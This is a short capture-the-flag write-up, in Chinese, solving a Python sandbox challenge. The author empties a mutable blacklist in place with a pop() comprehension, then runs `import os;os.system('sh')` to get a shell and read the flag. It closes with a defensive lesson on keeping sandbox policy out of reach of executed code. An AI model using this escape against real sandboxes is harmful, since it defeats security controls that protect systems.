# Pyjail 1

## 题目简述

程序允许执行两条 Python 语句，并在每次执行前遍历可变的全局 `blacklist`。第一条语句虽然不能直接导入模块，却可以原地清空这份列表，使第二轮检查失效。

## 解题过程

第一轮提交：

```python
[blacklist.pop() for i in range(len(blacklist))]
```

该表达式本身不包含当前列表中的禁用片段，执行后通过 `pop()` 删除全部元素。第二轮再提交：

```python
import os;os.system('sh')
```

此时检查循环遍历空列表，命令可直接执行。进入 shell 后读取 `flag.txt`：

```text
n00bz{blacklist.pop()_ftw!_7a5d2f8b}
```

## 方法总结

沙箱策略不应作为可写对象暴露给被执行代码。即使禁用词很多，只要攻击者能修改策略状态，后续检查就会失效；真正的隔离需要收缩语言能力并置于独立权限边界。
